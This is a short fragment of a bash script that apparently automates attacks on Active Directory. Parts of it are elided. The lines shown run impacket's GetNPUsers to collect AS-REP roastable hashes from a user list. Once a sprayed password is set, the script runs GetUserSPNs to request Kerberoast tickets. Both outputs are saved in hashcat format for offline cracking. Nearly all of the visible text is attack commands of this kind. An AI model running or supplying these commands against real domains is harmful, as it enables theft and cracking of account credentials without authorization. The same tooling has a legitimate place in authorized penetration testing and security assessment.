...
if [ -n "$check_users" ];then
	...
	#ASP_REQ_ROAST_CHECK 
	impacket-GetNPUsers.py $domain/ -usersfile users.txt -format hashcat -outputfile hash.asproast
	...
	if [ -n "$passspray" ];then
		...
		impacket-GetUserSPNs.py  -request -dc-ip $ip $domain/$passspray  -outputfile hashes.kerberoast 
